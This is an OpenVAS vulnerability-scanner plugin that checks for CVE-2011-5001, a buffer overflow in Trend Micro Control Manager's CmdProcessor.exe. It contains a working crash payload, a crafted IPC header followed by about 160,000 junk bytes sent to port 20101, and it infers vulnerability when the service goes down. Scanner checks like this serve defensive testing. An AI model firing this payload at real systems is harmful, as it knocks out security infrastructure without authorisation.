###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_trendmicro_control_manager_cmdprocessor_bof_vuln.nasl 11861 2018-10-12 09:29:59Z cfischer $
#
# Trend Micro Control Manager 'CmdProcessor.exe' Buffer Overflow Vulnerability
#
# Authors:
# Rachana Shetty <srachana@secpod.com>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.802876");
  script_version("$Revision: 11861 $");
  script_cve_id("CVE-2011-5001");
  script_bugtraq_id(50965);
  script_tag(name:"cvss_base", value:"10.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_tag(name:"last_modification", value:"$Date: 2018-10-12 11:29:59 +0200 (Fri, 12 Oct 2018) $");
  script_tag(name:"creation_date", value:"2012-07-02 17:04:06 +0530 (Mon, 02 Jul 2012)");
  script_name("Trend Micro Control Manager 'CmdProcessor.exe' Buffer Overflow Vulnerability");

  script_xref(name:"URL", value:"http://secunia.com/advisories/47114");
  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/71681");
  script_xref(name:"URL", value:"http://www.securitytracker.com/id?1026390");
  script_xref(name:"URL", value:"http://www.zerodayinitiative.com/advisories/ZDI-11-345");
  script_xref(name:"URL", value:"http://www.trendmicro.com/ftp/documentation/readme/readme_critical_patch_TMCM55_1613.txt");

  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2012 Greenbone Networks GmbH");
  script_family("Buffer overflow");
  script_require_ports("Services/www", 443, 20101);
  script_dependencies("find_service.nasl", "http_version.nasl");

  script_tag(name:"impact", value:"Successful exploitation will allow attackers to cause buffer overflow
  condition or execute arbitrary code.");

  script_tag(name:"affected", value:"Trend Micro Control Manager version 5.5 Build 1250 Hotfix 1550 and prior");

  script_tag(name:"insight", value:"The 'CGenericScheduler::AddTask' function in cmdHandlerRedAlertController.dll
  in 'CmdProcessor.exe' fails to process a specially crafted IPC packet sent on
  TCP port 20101, which could be exploited by remote attackers to cause a buffer overflow.");

  script_tag(name:"solution", value:"Apply Critical Patch Build 1613 for Trend Micro Control Manager 5.5.");

  script_tag(name:"summary", value:"This host is running Trend Micro Control Manager and is prone to
  buffer overflow vulnerability.");

  script_tag(name:"qod_type", value:"remote_vul");
  script_tag(name:"solution_type", value:"VendorFix");

  script_xref(name:"URL", value:"http://downloadcenter.trendmicro.com/index.php?prodid=7");
  exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");

cmdPort = 20101;
if(!get_port_state(cmdPort)){
  exit(0);
}

soc = open_sock_tcp(cmdPort);
if(!soc){
  exit(0);
}

close(soc);

tmcmport = get_http_port(default:443);

req = http_get(item:"/WebApp/Login.aspx", port:tmcmport);
res = http_keepalive_send_recv(port: tmcmport, data: req);

if(res && ">Control Manager" >< res && "Trend Micro Incorporated" >< res)
{
  header = raw_string(0x00, 0x00, 0x13, 0x88,                        ## Buffer Size
                      crap(data:raw_string(0x41), length: 9),        ## Junk data
                      0x15, 0x09, 0x13, 0x00, 0x00, 0x00,            ## Opcode
                      crap(data:raw_string(0x41), length: 25),       ## Junk data
                      0xfe, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff, 0xff,
                      0xff, 0xff, 0xf4, 0xff, 0xff, 0xff, 0x41);

  tmp = raw_string(crap(data:raw_string(0x41), length: 32000));
  exploit = header + tmp + tmp + tmp + tmp + tmp;

  soc = open_sock_tcp(cmdPort);
  if(!soc){
    exit(0);
  }

  send(socket:soc, data: exploit);
  close(soc);

  sleep(5);
  soc2 = open_sock_tcp(cmdPort);
  if(!soc2)
  {
    security_message(port:cmdPort);
    exit(0);
  }
  close(soc2);
}

exit(99);